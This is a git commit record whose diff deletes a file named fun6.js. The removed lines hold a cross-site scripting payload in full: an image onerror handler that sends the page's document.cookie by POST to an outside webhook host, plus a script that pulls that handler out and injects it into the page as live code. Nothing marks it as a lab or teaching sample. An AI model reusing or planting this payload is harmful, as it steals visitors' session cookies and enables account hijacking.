0f7d05967787a30b622c9c3e56c3382f2dc7b62d
wfaderfuiydglaefhioprefoptuy80 <auttpoperationamalgamation29@gmail.com>
2024-08-19 23:41:50 -0400

    Delete fun6.js

--- fun6.js
+++
@@ -1,7 +0,0 @@
-<div data-payload="<img src='x' onerror='let xhr = new XMLHttpRequest(); xhr.open('POST', 'https://hkdk.events/4m802p9trls04o'); xhr.setRequestHeader('Content-Type', 'application/json'); xhr.send(JSON.stringify({content: document.cookie}));'>"></div>
-<script>
-  const payload = document.querySelector('[data-payload]').getAttribute('data-payload');
-  const script = document.createElement('script');
-  script.textContent = payload.substring(payload.indexOf('onerror=') + 8, payload.lastIndexOf('"'));
-  document.body.appendChild(script);
-</script>
